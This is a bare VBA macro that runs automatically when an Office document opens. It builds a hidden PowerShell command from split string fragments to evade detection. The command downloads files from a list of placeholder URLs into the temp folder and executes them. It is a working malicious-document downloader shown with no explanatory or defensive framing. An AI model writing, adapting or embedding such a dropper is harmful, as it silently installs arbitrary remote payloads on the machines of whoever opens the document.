Sub AutoOpen()
    Dim cc As String
    cc = "pow"
    cc = cc + "ers"
    cc = cc + "hell "
    cc = cc + "-NoP -NonI -W Hidden """
    
    cc = cc + "('url1','url2')"
    
    cc = cc + "|foreach{$fileName=$env:temp+'\'+(Split-Path -Path $_ -Leaf);"
    
    cc = cc + "(new-object System.Net.WebClient).DownloadFile($_,$fileName);"
    
    cc = cc + "Invoke-Item $fileName;}"
    
    cc = cc + """"

    VBA.CreateObject("WScript.Shell").Run cc, 0

End Sub
